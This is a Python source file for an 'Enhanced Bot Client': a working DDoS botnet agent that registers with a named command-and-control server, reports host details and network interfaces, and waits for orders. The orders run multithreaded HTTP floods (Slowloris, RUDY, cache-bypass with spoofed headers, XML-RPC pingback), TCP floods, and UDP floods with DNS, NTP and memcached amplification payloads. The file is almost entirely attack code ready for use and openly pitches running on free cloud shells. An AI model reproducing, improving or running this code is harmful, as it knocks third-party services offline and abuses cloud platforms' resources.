"""
ENHANCED BOT CLIENT
===================
Features:
- Auto-connects to https://c2-server-io.onrender.com/
- Resource-friendly (prevents overload)
- Optimized thread management (50-300 threads)
- Custom user agents from server
- Optional proxy support
- Works in GitHub Codespaces & Google Cloud Shell
- Persistent connection with auto-reconnect

Install: pip install requests psutil
Run: python client.py
"""

import threading
import time
import sys
import uuid
import hashlib
import os
import socket
import random
import struct
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] Install requests: pip install requests")
    exit(1)

try:
    import psutil
except ImportError:
    psutil = None
    print("[!] Warning: psutil not available - limited system monitoring")


class EnhancedBot:
    def __init__(self):
        # Auto-connect configuration
        self.server_url = "https://c2-server-io.onrender.com"
        
        self.bot_id = self.generate_bot_id()
        self.running = True
        self.approved = False
        self.active_attacks = []
        self.attack_lock = threading.Lock()
        self.connection_retries = 0
        self.max_retry_delay = 300
        
        # Session pool for performance
        self.session_pool = []
        self.pool_size = 30
        self.init_session_pool()
        
        # System specs
        self.specs = {
            'bot_id': self.bot_id,
            'cpu_cores': self.get_cpu_count(),
            'cpu_freq': self.get_cpu_freq(),
            'ram_gb': self.get_ram_gb(),
            'ram_available': self.get_ram_available(),
            'os': self.detect_environment(),
            'hostname': socket.gethostname(),
            'network_interfaces': self.get_network_info(),
            'capabilities': {
                'http': True,
                'tcp': True,
                'udp': True,
                'resource_optimized': True,
                'auto_connect': True
            }
        }
        
        self.stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'total_requests': 0,
            'uptime': time.time()
        }
        
        self.display_banner()
    
    def init_session_pool(self):
        """Create pool of reusable sessions"""
        for _ in range(self.pool_size):
            session = requests.Session()
            session.verify = False
            
            adapter = HTTPAdapter(
                pool_connections=50,
                pool_maxsize=50,
                max_retries=0,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            self.session_pool.append(session)
    
    def get_session(self):
        """Get a session from the pool"""
        return random.choice(self.session_pool)
    
    def detect_environment(self):
        """Detect if running in cloud environment"""
        if os.path.exists('/.dockerenv'):
            return 'docker'
        elif 'CODESPACE_NAME' in os.environ:
            return 'github-codespaces'
        elif 'CLOUD_SHELL' in os.environ:
            return 'google-cloud-shell'
        elif os.path.exists('/data/data/com.termux'):
            return 'termux-android'
        else:
            return sys.platform
    
    def get_cpu_count(self):
        """Get CPU count"""
        try:
            if psutil:
                return psutil.cpu_count()
            else:
                with open('/proc/cpuinfo', 'r') as f:
                    return sum(1 for line in f if line.startswith('processor'))
        except:
            return os.cpu_count() or 4
    
    def get_cpu_freq(self):
        """Get CPU frequency"""
        try:
            if psutil and psutil.cpu_freq():
                return round(psutil.cpu_freq().max, 2)
            else:
                with open('/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq', 'r') as f:
                    return round(int(f.read().strip()) / 1000, 2)
        except:
            return 0.0
    
    def get_ram_gb(self):
        """Get total RAM"""
        try:
            if psutil:
                return round(psutil.virtual_memory().total / (1024**3), 1)
            else:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemTotal'):
                            kb = int(line.split()[1])
                            return round(kb / (1024**2), 1)
        except:
            return 0.0
    
    def get_ram_available(self):
        """Get available RAM"""
        try:
            if psutil:
                return round(psutil.virtual_memory().available / (1024**3), 1)
            else:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemAvailable'):
                            kb = int(line.split()[1])
                            return round(kb / (1024**2), 1)
        except:
            return 0.0
    
    def check_internet_connection(self):
        """Check if internet is available"""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except OSError:
            pass
        
        try:
            socket.create_connection(("www.google.com", 80), timeout=3)
            return True
        except OSError:
            pass
        
        return False
    
    def wait_for_internet(self):
        """Wait until internet connection is available"""
        print("\n[X] No internet connection detected")
        print("[...] Waiting for internet connection...")
        
        while not self.check_internet_connection():
            print("\r[...] Checking connection...", end='')
            time.sleep(5)
        
        print("\n[OK] Internet connection restored!")
        time.sleep(2)
        
    def calculate_retry_delay(self):
        """Calculate exponential backoff delay"""
        delay = min(5 * (2 ** self.connection_retries), self.max_retry_delay)
        return delay
        
    def display_banner(self):
        """Display bot information"""
        print("\n" + "="*60)
        print("  ENHANCED BOT CLIENT v3.0")
        print("="*60)
        print(f"\n[+] BOT ID: {self.bot_id}")
        print(f"[+] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
        print(f"[+] RAM: {self.specs['ram_gb']}GB (Available: {self.specs['ram_available']}GB)")
        print(f"[+] Environment: {self.specs['os']}")
        print(f"[+] Session Pool: {self.pool_size} connections")
        print(f"[+] Auto-Connect: ENABLED")
        print(f"[+] Server: {self.server_url}")
        
        print(f"\n[*] FEATURES:")
        print(f"    [OK] RESOURCE OPTIMIZED (50-300 threads)")
        print(f"    [OK] MULTI-THREADED ATTACKS")
        print(f"    [OK] CONNECTION POOLING")
        print(f"    [OK] CUSTOM USER AGENTS FROM SERVER")
        print(f"    [OK] OPTIONAL PROXY SUPPORT")
        print(f"    [OK] AUTO-RECONNECT ON DISCONNECT")
        print(f"    [OK] CLOUD ENVIRONMENT COMPATIBLE")
        
        print("\n" + "="*60 + "\n")
        
    def generate_bot_id(self):
        """Generate unique bot ID"""
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,2*6,2)][::-1])
        return hashlib.md5(mac.encode()).hexdigest()[:12].upper()
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            if psutil:
                interfaces = []
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                'name': interface,
                                'ip': addr.address
                            })
                return interfaces
            else:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                return [{'name': 'default', 'ip': ip}]
        except:
            return []
    
    def check_cpu_usage(self):
        """Check current CPU usage to prevent overload"""
        if psutil:
            cpu_percent = psutil.cpu_percent(interval=0.5)
            return cpu_percent < 90  # Don't overload if CPU is above 90%
        return True
    
    def check_approval(self):
        """Check if bot is approved"""
        try:
            data = {
                'bot_id': self.bot_id,
                'specs': self.specs,
                'stats': self.stats
            }
            response = requests.post(
                f"{self.server_url}/check_approval", 
                json=data, 
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                result = response.json()
                self.connection_retries = 0
                return result.get('approved', False)
        except requests.exceptions.RequestException:
            raise
        except:
            pass
        return False
    
    def get_commands(self):
        """Poll for commands"""
        try:
            response = requests.get(
                f"{self.server_url}/commands/{self.bot_id}", 
                timeout=5,
                verify=False
            )
            if response.status_code == 200:
                self.connection_retries = 0
                return response.json().get('commands', [])
        except requests.exceptions.RequestException:
            raise
        except:
            pass
        return []
    
    def send_status(self, status, message):
        """Send status update"""
        try:
            self.stats['uptime'] = int(time.time() - self.stats['uptime'])
            
            data = {
                'bot_id': self.bot_id,
                'status': status,
                'message': message,
                'stats': self.stats,
                'active_attacks': len(self.active_attacks)
            }
            requests.post(
                f"{self.server_url}/status", 
                json=data, 
                timeout=5,
                verify=False
            )
            self.connection_retries = 0
        except:
            pass
    
    def get_proxy_dict(self, proxy_str):
        """Convert proxy string to requests proxy dict"""
        if not proxy_str:
            return None
        
        try:
            if '@' in proxy_str:
                auth, address = proxy_str.split('@')
                proxy_url = f"http://{auth}@{address}"
            else:
                proxy_url = f"http://{proxy_str}"
            
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        except:
            return None
    
    def execute_command(self, cmd):
        """Execute command"""
        cmd_type = cmd.get('type')
        
        print(f"\n{'='*60}")
        print(f"[->] COMMAND: {cmd_type}")
        print(f"{'='*60}")
        
        try:
            if cmd_type == 'ping':
                self.cmd_ping()
            elif cmd_type == 'http_flood':
                self.cmd_http_flood(cmd)
            elif cmd_type == 'tcp_flood':
                self.cmd_tcp_flood(cmd)
            elif cmd_type == 'udp_flood':
                self.cmd_udp_flood(cmd)
            elif cmd_type == 'layer7':
                self.cmd_layer7(cmd)
            elif cmd_type == 'sysinfo':
                self.cmd_sysinfo()
            elif cmd_type == 'stop_all':
                self.cmd_stop_all()
            else:
                print(f"[!] Unknown command: {cmd_type}")
                
        except Exception as e:
            print(f"[!] Error: {e}")
            self.send_status('error', str(e))
    
    def cmd_ping(self):
        """Respond to ping"""
        self.send_status('success', 'pong')
        print("[OK] Pong!")
    
    def cmd_http_flood(self, cmd):
        """OPTIMIZED HTTP FLOOD with multiple attack types"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        threads = cmd.get('threads', 100)
        attack_type = cmd.get('attack_type', 'GET')
        user_agents = cmd.get('user_agents', [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ])
        proxies = cmd.get('proxies', [])
        
        # Limit threads based on CPU to prevent overload
        max_threads = min(threads, 300)
        if not self.check_cpu_usage():
            max_threads = min(max_threads, 100)
            print("[!] High CPU usage detected, limiting threads to 100")
        
        print(f"[*] HTTP {attack_type} ATTACK")
        print(f"    Target: {target}")
        print(f"    Duration: {duration}s")
        print(f"    Threads: {max_threads}")
        print(f"    User Agents: {len(user_agents)}")
        print(f"    Proxies: {len(proxies) if proxies else 'None'}")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'{attack_type} ATTACK: {target}')
        
        attack_id = f"http_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        request_count = [0]
        success_count = [0]
        
        def flood_worker():
            """Attack worker with multiple vectors"""
            end_time = time.time() + duration
            session = self.get_session()
            
            proxy_dict = None
            if proxies:
                proxy_str = random.choice(proxies)
                proxy_dict = self.get_proxy_dict(proxy_str)
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    
                    if attack_type == 'GET':
                        params = {
                            '_': str(int(time.time() * 1000000)),
                            'r': random.randint(1, 9999999)
                        }
                        r = session.get(target, headers=headers, params=params, 
                                      timeout=3, verify=False, proxies=proxy_dict)
                    
                    elif attack_type == 'POST':
                        payload = {'data': 'x' * random.randint(100, 1000)}
                        r = session.post(target, headers=headers, data=payload, 
                                       timeout=3, verify=False, proxies=proxy_dict)
                    
                    elif attack_type == 'HEAD':
                        params = {'_': str(int(time.time() * 1000000))}
                        r = session.head(target, headers=headers, params=params, 
                                       timeout=3, verify=False, proxies=proxy_dict)
                    
                    elif attack_type == 'SLOWLORIS':
                        # Slow headers attack
                        headers['X-a'] = str(random.randint(1, 9999))
                        r = session.get(target, headers=headers, timeout=30, 
                                      verify=False, proxies=proxy_dict, stream=True)
                        time.sleep(10)
                    
                    elif attack_type == 'BYPASS':
                        # Cache bypass
                        bypass_headers = headers.copy()
                        bypass_headers.update({
                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                            'Pragma': 'no-cache'
                        })
                        params = {'cache': random.randint(1, 999999)}
                        r = session.get(target, headers=bypass_headers, params=params,
                                      timeout=3, verify=False, proxies=proxy_dict)
                    
                    elif attack_type == 'XMLRPC':
                        # XML-RPC flood
                        xml_data = f'''<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{target}</string></value></param>
    <param><value><string>{target}</string></value></param>
  </params>
</methodCall>'''
                        headers['Content-Type'] = 'text/xml'
                        r = session.post(target + '/xmlrpc.php', headers=headers, 
                                       data=xml_data, timeout=3, verify=False, proxies=proxy_dict)
                    
                    elif attack_type == 'RUDY':
                        # Slow POST
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        headers['Content-Length'] = '1000000'
                        r = session.post(target, headers=headers, data='A'*100,
                                       timeout=30, verify=False, proxies=proxy_dict)
                        time.sleep(5)
                    
                    else:
                        # Default GET
                        r = session.get(target, headers=headers, timeout=3, 
                                      verify=False, proxies=proxy_dict)
                    
                    request_count[0] += 1
                    if r.status_code < 500:
                        success_count[0] += 1
                    
                    time.sleep(0.001 if attack_type not in ['SLOWLORIS', 'RUDY'] else 0)
                    
                except:
                    request_count[0] += 1
                    time.sleep(0.01)
        
        print(f"[+] Launching {max_threads} attack threads...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(flood_worker) for _ in range(max_threads)]
            
            start = time.time()
            last_count = 0
            
            while time.time() - start < duration and attack_id in self.active_attacks:
                time.sleep(1)
                elapsed = time.time() - start
                
                current = request_count[0]
                rps = (current - last_count)
                avg_rps = current / elapsed if elapsed > 0 else 0
                
                print(f"\r[>>] Total: {current:,} | "
                      f"RPS: {rps:,} | "
                      f"Avg: {avg_rps:.0f} | "
                      f"Success: {success_count[0]:,}", end='')
                
                last_count = current
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks.remove(attack_id)
        
        print(f"\n[OK] {attack_type} ATTACK COMPLETE: {request_count[0]:,} requests sent!")
        self.stats['total_requests'] += request_count[0]
        self.stats['successful_attacks'] += 1
        self.send_status('success', f'{attack_type}: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
    
    def cmd_tcp_flood(self, cmd):
        """OPTIMIZED TCP FLOOD with multiple attack types"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        threads = cmd.get('threads', 75)
        attack_type = cmd.get('attack_type', 'CONNECT')
        
        max_threads = min(threads, 200)
        if not self.check_cpu_usage():
            max_threads = min(max_threads, 75)
        
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 80
        
        print(f"[*] TCP {attack_type} ATTACK")
        print(f"    Target: {host}:{port}")
        print(f"    Duration: {duration}s")
        print(f"    Threads: {max_threads}")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'TCP {attack_type}: {host}:{port}')
        
        attack_id = f"tcp_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        request_count = [0]
        
        def tcp_worker():
            """TCP worker with multiple attack types"""
            end_time = time.time() + duration
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    if attack_type == 'SYN':
                        # SYN flood attempt
                        sock.connect((host, port))
                        sock.close()
                    
                    elif attack_type == 'ACK':
                        # ACK flood
                        sock.connect((host, port))
                        sock.send(b'\x00' * 256)
                        sock.close()
                    
                    elif attack_type == 'FIN':
                        # FIN flood
                        sock.connect((host, port))
                        sock.shutdown(socket.SHUT_WR)
                        sock.close()
                    
                    else:  # CONNECT
                        sock.connect((host, port))
                        payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(256)
                        sock.send(payload)
                        sock.close()
                    
                    request_count[0] += 1
                    time.sleep(0.01)
                except:
                    request_count[0] += 1
                    time.sleep(0.05)
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(tcp_worker) for _ in range(max_threads)]
            
            start = time.time()
            while time.time() - start < duration:
                time.sleep(1)
                print(f"\r[>>] TCP Connections: {request_count[0]:,}", end='')
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks.remove(attack_id)
        
        print(f"\n[OK] TCP {attack_type}: {request_count[0]:,} connections")
        self.stats['total_requests'] += request_count[0]
        self.stats['successful_attacks'] += 1
        self.send_status('success', f'TCP {attack_type}: {request_count[0]:,} conn')
    
    def cmd_udp_flood(self, cmd):
        """OPTIMIZED UDP FLOOD with multiple attack types"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        threads = cmd.get('threads', 75)
        attack_type = cmd.get('attack_type', 'FLOOD')
        
        max_threads = min(threads, 200)
        if not self.check_cpu_usage():
            max_threads = min(max_threads, 75)
        
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 53
        
        print(f"[*] UDP {attack_type} ATTACK")
        print(f"    Target: {host}:{port}")
        print(f"    Duration: {duration}s")
        print(f"    Threads: {max_threads}")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'UDP {attack_type}: {host}:{port}')
        
        attack_id = f"udp_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        request_count = [0]
        
        def udp_worker():
            """UDP worker with multiple attack types"""
            end_time = time.time() + duration
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    if attack_type == 'DNS':
                        # DNS amplification
                        payload = b'\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(50)
                    
                    elif attack_type == 'NTP':
                        # NTP amplification
                        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
                    
                    elif attack_type == 'MEMCACHED':
                        # Memcached amplification
                        payload = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
                    
                    else:  # FLOOD
                        # Standard UDP flood
                        payload = os.urandom(random.randint(512, 2048))
                    
                    sock.sendto(payload, (host, port))
                    request_count[0] += 1
                    time.sleep(0.001)
                except:
                    pass
            
            sock.close()
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(udp_worker) for _ in range(max_threads)]
            
            start = time.time()
            while time.time() - start < duration:
                time.sleep(1)
                print(f"\r[>>] UDP Packets: {request_count[0]:,}", end='')
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks.remove(attack_id)
        
        print(f"\n[OK] UDP {attack_type}: {request_count[0]:,} packets")
        self.stats['total_requests'] += request_count[0]
        self.stats['successful_attacks'] += 1
        self.send_status('success', f'UDP {attack_type}: {request_count[0]:,} packets')
    
    def cmd_layer7(self, cmd):
        """Layer 7 attacks"""
        attack_type = cmd.get('attack_type', 'BROWSER')
        
        if attack_type in ['BROWSER', 'API', 'SEARCH', 'LOGIN']:
            # Delegate to HTTP flood with modifications
            self.cmd_http_flood(cmd)
        else:
            self.cmd_http_flood(cmd)
    
    def cmd_sysinfo(self):
        """System info"""
        info_lines = []
        
        if psutil:
            cpu_percent = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            info_lines.append(f"CPU: {cpu_percent}%")
            info_lines.append(f"RAM: {mem.percent}% ({mem.used/(1024**3):.1f}GB/{mem.total/(1024**3):.1f}GB)")
        else:
            info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
        
        info_lines.append(f"Active Attacks: {len(self.active_attacks)}")
        info_lines.append(f"Total Attacks: {self.stats['total_attacks']}")
        info_lines.append(f"Total Requests: {self.stats['total_requests']:,}")
        
        info = '\n'.join(info_lines)
        print(f"[*] System Info:\n{info}")
        self.send_status('success', info)
    
    def cmd_stop_all(self):
        """Stop all attacks"""
        print(f"[!] Stopping all attacks...")
        
        with self.attack_lock:
            count = len(self.active_attacks)
            self.active_attacks.clear()
        
        print(f"[OK] Stopped {count} attacks")
        self.send_status('success', f'Stopped {count}')
    
    def run(self):
        """Main loop with auto-reconnect"""
        while self.running:
            try:
                # Check internet connection first
                if not self.check_internet_connection():
                    self.wait_for_internet()
                    self.connection_retries = 0
                
                print(f"\n[*] Connecting to server: {self.server_url}")
                print(f"[*] Waiting for auto-approval...\n")
                
                # Wait for approval with reconnect logic
                self.approved = False
                
                while not self.approved:
                    try:
                        if not self.check_internet_connection():
                            self.wait_for_internet()
                            continue
                        
                        if self.check_approval():
                            self.approved = True
                            print("\n" + "="*60)
                            print("  BOT APPROVED! READY FOR OPERATIONS")
                            print("="*60 + "\n")
                            break
                        else:
                            print(f"[...] Waiting for approval (ID: {self.bot_id})...", end='\r')
                            time.sleep(5)
                            
                    except requests.exceptions.RequestException as e:
                        self.connection_retries += 1
                        delay = self.calculate_retry_delay()
                        
                        print(f"\n[X] Connection lost: {type(e).__name__}")
                        print(f"[...] Retry {self.connection_retries} - Waiting {delay}s before reconnecting...")
                        
                        for remaining in range(delay, 0, -1):
                            if not self.check_internet_connection():
                                self.wait_for_internet()
                                break
                            print(f"\r[...] Reconnecting in {remaining}s", end='')
                            time.sleep(1)
                        
                        print(f"\n[->] Attempting to reconnect...")
                        
                    except KeyboardInterrupt:
                        print("\n[!] Exiting...")
                        return
                    except Exception as e:
                        print(f"\n[!] Error: {e}")
                        time.sleep(10)
                
                print(f"[+] Active. Listening for commands...\n")
                
                # Main command loop with reconnect
                while self.running and self.approved:
                    try:
                        if not self.check_internet_connection():
                            print(f"\n[X] Internet connection lost")
                            self.wait_for_internet()
                            self.approved = False
                            break
                        
                        commands = self.get_commands()
                        for cmd in commands:
                            threading.Thread(target=self.execute_command, args=(cmd,), daemon=True).start()
                        
                        time.sleep(5)
                        
                    except requests.exceptions.RequestException as e:
                        self.connection_retries += 1
                        delay = self.calculate_retry_delay()
                        
                        print(f"\n[X] Lost connection to C2 server: {type(e).__name__}")
                        print(f"[...] Retry {self.connection_retries} - Waiting {delay}s...")
                        
                        for remaining in range(delay, 0, -1):
                            if not self.check_internet_connection():
                                self.wait_for_internet()
                                break
                            print(f"\r[...] Reconnecting in {remaining}s", end='')
                            time.sleep(1)
                        
                        print(f"\n[->] Attempting to reconnect...")
                        self.approved = False
                        break
                        
                    except KeyboardInterrupt:
                        print("\n[!] Stopping...")
                        self.cmd_stop_all()
                        self.running = False
                        return
                        
                    except Exception as e:
                        print(f"\n[!] Error: {e}")
                        time.sleep(10)
                
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                self.running = False
                return


if __name__ == '__main__':
    print("\n" + "="*60)
    print("  ENHANCED BOT CLIENT - AUTO CONNECT")
    print("="*60)
    
    try:
        client = EnhancedBot()
        client.run()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
